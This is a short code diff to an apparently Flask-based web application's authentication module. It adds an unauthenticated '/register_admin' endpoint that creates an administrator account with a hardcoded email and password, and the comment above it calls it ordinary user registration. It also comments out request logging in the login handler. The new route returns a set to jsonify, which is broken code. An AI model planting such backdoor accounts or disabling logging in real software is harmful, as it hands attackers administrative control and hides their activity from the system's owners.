@@ -55,6 +55,23 @@ def register_user():
 
     return jsonify({"id": new_user.id, "email": new_user.email})
 
+# Register a new user
+@app.route("/register_admin", methods=["POST"])
+def register_admin():
+
+    user_exists = User.query.filter_by(email="admin@gmail.com").first() is not None
+
+    if user_exists:
+        return jsonify({"error": "User already exists"}), 409
+
+    
+    hashed_password = bcrypt.generate_password_hash("ttticc")
+    new_user = User(email="admin@gmail.com", password=hashed_password, is_admin=True)
+    db.session.add(new_user)
+    db.session.commit()
+
+    return jsonify({"created"})
+
 @app.route("/current_user")
 def get_current_user():
     user_id = session.get("user_id")
@@ -74,7 +91,7 @@ def login_user():
     user = User.query.filter_by(email=email).first()
     
     # Log the request
-    log_request(None, request.path, data, 'POST', client_ip, 400, response)
+    # log_request(None, request.path, data, 'POST', client_ip, 400, response)
     if user is None:
         return jsonify({"error": "Unauthorized"}), 401
 
